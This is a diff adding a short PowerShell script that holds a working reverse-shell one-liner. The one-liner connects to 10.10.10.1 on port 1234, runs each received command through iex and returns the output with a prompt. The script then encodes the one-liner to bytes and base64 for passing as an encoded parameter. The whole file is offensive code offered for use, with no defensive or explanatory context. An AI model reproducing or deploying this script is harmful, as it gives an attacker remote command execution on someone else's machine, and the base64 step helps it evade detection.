@@ -1,0 +1,7 @@
+$Oneliner = '$tcp_client=New-Object System.Net.Sockets.TCPClient("10.10.10.1",1234);$client_stream=$tcp_client.GetStream();[byte[]]$stream_bytes=0..65535|%{0};while(($i=$client_stream.Read($stream_bytes,0,$stream_bytes.Length)) -ne 0){;$stream_data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($stream_bytes,0,$i);$response=(iex $stream_data 2>&1 | Out-String );$response2=$response+"PS "+(pwd).Path + "> ";$response_byte=([text.encoding]::ASCII).GetBytes($response2);$client_stream.Write($response_byte,0,$response_byte.Length);$client_stream.Flush()};$tcp_client.Close()'
+
+##Encoded to bytes if needed
+$ToBytes = [System.Text.Encoding]::Unicode.GetBytes($Oneliner)
+
+##Encoded to base64 if needed as a parameter etc.
+$Base64Enc =[Convert]::ToBase64String($ToBytes)
